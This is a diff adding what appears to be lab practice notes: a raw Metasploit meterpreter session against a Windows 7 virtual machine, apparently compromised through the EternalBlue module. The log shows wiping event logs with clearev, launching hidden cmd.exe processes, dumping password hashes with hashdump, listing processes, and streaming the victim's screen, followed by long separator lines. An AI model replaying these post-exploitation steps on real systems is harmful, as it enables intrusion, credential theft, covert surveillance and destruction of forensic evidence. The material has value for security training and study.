@@ -1498,10 +1498,339 @@ meterpreter > clearev
 [*] Wiping 1137 records from System...
 [*] Wiping 307 records from Security...
 
+meterpreter > ls
+Listing: C:\Windows\system32
+============================
+
+Mode              Size      Type  Last modified              Name
+----              ----      ----  -------------              ----
+040777/rwxrwxrwx  0         dir   2009-07-14 01:42:33 -0400  0409
+100666/rw-rw-rw-  9600      fil   2024-08-18 10:04:05 -0400  7B296FB0-376B-497e-B012-9C450E1B7327-5P-0.C7483456-A289-439d-8115-601632D005A0
+100666/rw-rw-rw-  9600      fil   2024-08-18 10:04:05 -0400  7B296FB0-376B-497e-B012-9C450E1B7327-5P-1.C7483456-A289-439d-8115-601632D005A0
+100666/rw-rw-rw-  39424     fil   2009-07-13 21:24:45 -0400  ACCTRES.dll
+100777/rwxrwxrwx  24064     fil   2009-07-13 21:38:55 -0400  ARP.EXE
+...........................................................................................................................
+r
+meterpreter > pwd
+c:\
+meterpreter > whoami
+i
+meterpreter > cd ..
+meterpreter > pwd
+c:\
+meterpreter > ls
+Listing: c:\
+============
+
+Mode              Size    Type  Last modified              Name
+----              ----    ----  -------------              ----
+040777/rwxrwxrwx  0       dir   2024-08-16 03:04:55 -0400  $Recycle.Bin
+100444/r--r--r--  8192    fil   2024-08-16 16:31:55 -0400  BOOTSECT.BAK
+040777/rwxrwxrwx  4096    dir   2024-08-16 16:31:54 -0400  Boot
+040777/rwxrwxrwx  0       dir   2024-08-16 03:07:21 -0400  Config.Msi
+040777/rwxrwxrwx  0       dir   2009-07-14 01:08:02 -0400  Documents and Settings
+040777/rwxrwxrwx  0       dir   2009-07-13 23:20:08 -0400  PerfLogs
+040555/r-xr-xr-x  4096    dir   2024-08-16 03:07:21 -0400  Program Files
+040555/r-xr-xr-x  4096    dir   2009-07-14 00:59:53 -0400  Program Files (x86)
+040777/rwxrwxrwx  4096    dir   2024-08-16 03:07:21 -0400  ProgramData
+040777/rwxrwxrwx  0       dir   2024-08-16 03:04:48 -0400  Recovery
+040777/rwxrwxrwx  4096    dir   2024-08-16 03:07:02 -0400  System Volume Information
+040555/r-xr-xr-x  4096    dir   2024-08-16 03:04:49 -0400  Users
+040777/rwxrwxrwx  16384   dir   2024-08-16 03:05:19 -0400  Windows
+100444/r--r--r--  383786  fil   2010-11-20 07:40:08 -0500  bootmgr
+000000/---------  0       fif   1969-12-31 19:00:00 -0500  hiberfil.sys
+000000/---------  0       fif   1969-12-31 19:00:00 -0500  pagefile.sys
+
+meterpreter > cd Users
+meterpreter > ls
+Listing: c:\Users
+=================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+040777/rwxrwxrwx  0     dir   2009-07-14 01:08:02 -0400  All Users
+040555/r-xr-xr-x  8192  dir   2009-07-14 03:00:50 -0400  Default
+040777/rwxrwxrwx  0     dir   2009-07-14 01:08:02 -0400  Default User
+040555/r-xr-xr-x  4096  dir   2009-07-14 00:59:13 -0400  Public
+100666/rw-rw-rw-  174   fil   2009-07-14 00:59:13 -0400  desktop.ini
+040777/rwxrwxrwx  8192  dir   2024-08-16 03:05:02 -0400  omkant
+
+meterpreter > dir
+Listing: c:\Users
+=================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+040777/rwxrwxrwx  0     dir   2009-07-14 01:08:02 -0400  All Users
+040555/r-xr-xr-x  8192  dir   2009-07-14 03:00:50 -0400  Default
+040777/rwxrwxrwx  0     dir   2009-07-14 01:08:02 -0400  Default User
+040555/r-xr-xr-x  4096  dir   2009-07-14 00:59:13 -0400  Public
+100666/rw-rw-rw-  174   fil   2009-07-14 00:59:13 -0400  desktop.ini
+040777/rwxrwxrwx  8192  dir   2024-08-16 03:05:02 -0400  omkant
+
+meterpreter > mkdir omk
+Creating directory: omk
+meterpreter > dir
+Listing: c:\Users
+=================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+040777/rwxrwxrwx  0     dir   2009-07-14 01:08:02 -0400  All Users
+040555/r-xr-xr-x  8192  dir   2009-07-14 03:00:50 -0400  Default
+040777/rwxrwxrwx  0     dir   2009-07-14 01:08:02 -0400  Default User
+040555/r-xr-xr-x  4096  dir   2009-07-14 00:59:13 -0400  Public
+100666/rw-rw-rw-  174   fil   2009-07-14 00:59:13 -0400  desktop.ini
+040777/rwxrwxrwx  0     dir   2024-08-18 10:34:14 -0400  omk
+040777/rwxrwxrwx  8192  dir   2024-08-16 03:05:02 -0400  omkant
+......................................................................
+
+meterpreter > execute -h
+Usage: execute -f file [options]
+Executes a command on the remote machine.
+
+OPTIONS:
+
+    -a   The arguments to pass to the command.
+    -c   Channelized I/O (required for interaction).
+    -d   The 'dummy' executable to launch when using -m.
+    -f   The executable command to run.
+    -h   Help menu.
+    -H   Create the process hidden from view.
+    -i   Interact with the process after creating it.
+    -k   Execute process on the meterpreters current desktop
+    -m   Execute from memory.
+    -p   Execute process in a pty (if available on target platform)
+    -s   Execute process in a given session as the session user
+    -t   Execute process with currently impersonated thread token
+    -z   Execute process in a subshell
+meterpreter > 
+------------------------------------------------------------
+meterpreter > execute -H -i -f cmd.exe
+Process 1716 created.
+Channel 1 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+-----.....................
+C:\Windows\system32>
+
+--------------------------------------------------
+C:\Windows\system32>cd /USERs
+cd /USERs
+
+C:\Users>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is C6C6-7535
+
+ Directory of C:\Users
+
+08/18/2024  08:04 PM    <DIR>          .
+08/18/2024  08:04 PM    <DIR>          ..
+08/18/2024  08:04 PM    <DIR>          omk
+08/16/2024  12:35 PM    <DIR>          omkant
+07/14/2009  10:29 AM    <DIR>          Public
+               0 File(s)              0 bytes
+               5 Dir(s)  40,513,171,456 bytes free
+
+C:\Users>
+-----------------------------------------------------
+C:\Users> exit
+ exit
+meterpreter > 
+-----------------------------------------------------
+meterpreter > run post/windows/gather/hashdump
+
+[*] Obtaining the boot key...
+[*] Calculating the hboot key using SYSKEY 81a140eaaa9e3f2c3503f9e60047b6fb...
+[*] Obtaining the user list and keys...
+[*] Decrypting user keys...
+[*] Dumping password hints...
+
+No users with password hints on this system
+
+[*] Dumping password hashes...
+
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+omkant:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+--------------------------------------------------
+meterpreter > execute -h
+Usage: execute -f file [options]
+Executes a command on the remote machine.
+
+OPTIONS:
+
+    -a   The arguments to pass to the command.
+    -c   Channelized I/O (required for interaction).
+    -d   The 'dummy' executable to launch when using -m.
+    -f   The executable command to run.
+    -h   Help menu.
+    -H   Create the process hidden from view.
+    -i   Interact with the process after creating it.
+    -k   Execute process on the meterpreters current desktop
+    -m   Execute from memory.
+    -p   Execute process in a pty (if available on target platform)
+    -s   Execute process in a given session as the session user
+    -t   Execute process with currently impersonated thread token
+    -z   Execute process in a subshell
+meterpreter > execute -H -i -f cmd.exe
+Process 2904 created.
+Channel 1 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+--------------------------------------------------
+C:\Windows\system32>ipconfig
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Local Area Connection:
+
+   Connection-specific DNS Suffix  . : localdomain
+   Link-local IPv6 Address . . . . . : fe80::68a6:a19f:6315:c419%11
+   IPv4 Address. . . . . . . . . . . : 192.168.176.134
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.176.2
+
+Tunnel adapter isatap.localdomain:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : localdomain
+
+C:\Windows\system32>
+----------------------------------------------------------------
+C:\Windows\system32>exit
+exit
+meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name           Arch  Session  User                    Path
+ ---   ----  ----           ----  -------  ----                    ----
+ 0     0     [System Proce
+             ss]
+ 4     0     System         x64   0
+ 236   4     smss.exe       x64   0        NT AUTHORITY\SYSTEM     \SystemRoot\System32\sm
+                                                                   ss.exe
+ 248   452   svchost.exe    x64   0        NT AUTHORITY\NETWORK S
+                                           ERVICE
+ 308   300   csrss.exe      x64   0        NT AUTHORITY\SYSTEM     C:\Windows\system32\csr
+                                                                   ss.exe
+ 356   300   wininit.exe    x64   0        NT AUTHORITY\SYSTEM     C:\Windows\system32\win
+                                                                   init.exe
+ 368   348   csrss.exe      x64   1        NT AUTHORITY\SYSTEM     C:\Windows\system32\csr
+                                                                   ss.exe
+ 396   348   winlogon.exe   x64   1        NT AUTHORITY\SYSTEM     C:\Windows\system32\win
+                                                                   logon.exe
+ 452   356   services.exe   x64   0        NT AUTHORITY\SYSTEM     C:\Windows\system32\ser
+                                                                   vices.exe
+ 468   356   lsass.exe      x64   0        NT AUTHORITY\SYSTEM     C:\Windows\system32\lsa
+                                                                   ss.exe
+ 476   356   lsm.exe        x64   0        NT AUTHORITY\SYSTEM     C:\Windows\system32\lsm
+                                                                   .exe
+ 568   452   svchost.exe    x64   0        NT AUTHORITY\SYSTEM
+ 636   452   svchost.exe    x64   0        NT AUTHORITY\NETWORK S
+                                           ERVICE
+ 708   452   svchost.exe    x64   0        NT AUTHORITY\LOCAL SER
+                                           VICE
+ 780   452   svchost.exe    x64   0        NT AUTHORITY\SYSTEM
+ 804   452   svchost.exe    x64   0        NT AUTHORITY\SYSTEM
+ 884   780   dwm.exe        x64   1        WIN-2I9UQPS7BCS\omkant  C:\Windows\system32\Dwm
+                                                                   .exe
+ 948   452   svchost.exe    x64   0        NT AUTHORITY\LOCAL SER
+                                           VICE
+ 1068  452   taskhost.exe   x64   1        WIN-2I9UQPS7BCS\omkant  C:\Windows\system32\tas
+                                                                   khost.exe
+ 1080  348   explorer.exe   x64   1        WIN-2I9UQPS7BCS\omkant  C:\Windows\Explorer.EXE
+ 1092  452   wmpnetwk.exe   x64   0        NT AUTHORITY\NETWORK S
+                                           ERVICE
+ 1144  452   svchost.exe    x64   0        NT AUTHORITY\LOCAL SER
+                                           VICE
+ 1324  452   VGAuthService  x64   0        NT AUTHORITY\SYSTEM     C:\Program Files\VMware
+             .exe                                                  \VMware Tools\VMware VG
+                                                                   Auth\VGAuthService.exe
+ 1460  452   svchost.exe    x64   0        NT AUTHORITY\LOCAL SER
+                                           VICE
+ 1764  452   svchost.exe    x64   0        NT AUTHORITY\NETWORK S
+                                           ERVICE
+ 1960  452   SearchIndexer  x64   0        NT AUTHORITY\SYSTEM
+             .exe
+ 2368  452   sppsvc.exe     x64   0        NT AUTHORITY\NETWORK S
+                                           ERVICE
+ 2392  452   spoolsv.exe    x64   0        NT AUTHORITY\SYSTEM     C:\Windows\System32\spo
+                                                                   olsv.exe
+ 2404  452   svchost.exe    x64   0        NT AUTHORITY\SYSTEM
+
+meterpreter > 
+-------------------------------------------------------------------------------------------
+meterpreter > shell
+Process 1596 created.
+Channel 2 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>
+C:\Windows\system32>exit
+exit
+meterpreter > 
+
+------------------------------------------------------------------------
+meterpreter > screenshare
+[*] Preparing player...
+[*] Opening player at: /home/kali/FwwMBcJh.html
+[*] Streaming...
+Missing chrome or resource URL: resource://gre/modules/UpdateListener.jsm
+Missing chrome or resource URL: resource://gre/modules/UpdateListener.sys.mjs
+
+------------------------------------------------------------------------------------------
+meterpreter > background
+[*] Backgrounding session 4...
+-------------------------------------------------------------------------------------
+msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions 4
+[*] Starting interaction with 4...
+
+meterpreter > 
+------------------------------------------------------------------------------------
 
 
 
 
+
+
+
+
+===========================================================================================================================
+===========================================================================================================================
+===========================================================================================================================
+===========================================================================================================================
+===========================================================================================================================
+===========================================================================================================================
+===========================================================================================================================
+===========================================================================================================================
+===========================================================================================================================
+===========================================================================================================================
+===========================================================================================================================
+===========================================================================================================================
+===========================================================================================================================
+===========================================================================================================================
+===========================================================================================================================
+===========================================================================================================================
+===========================================================================================================================
+===========================================================================================================================
+===========================================================================================================================
+===========================================================================================================================
+===========================================================================================================================
+===========================================================================================================================
+===========================================================================================================================
+===========================================================================================================================
+===========================================================================================================================
+===========================================================================================================================
+===========================================================================================================================
 ===========================================================================================================================
 ===========================================================================================================================
 ===========================================================================================================================
